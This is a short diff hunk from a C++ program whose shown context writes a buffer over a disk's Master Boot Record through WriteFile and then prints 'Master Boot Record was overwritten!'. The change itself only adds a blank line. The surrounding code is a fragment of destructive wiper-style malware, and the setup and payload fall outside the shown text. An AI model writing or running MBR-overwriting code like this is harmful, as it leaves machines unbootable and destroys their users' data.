@@ -17,6 +17,7 @@ int main(){
 				 NULL,
 				 NULL
 				 );
+	
 if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &bytesWritten, NULL)) {
 	std::cout << "Master Boot Record was overwritten!";
 	CloseHandle(MasterBootRecord);
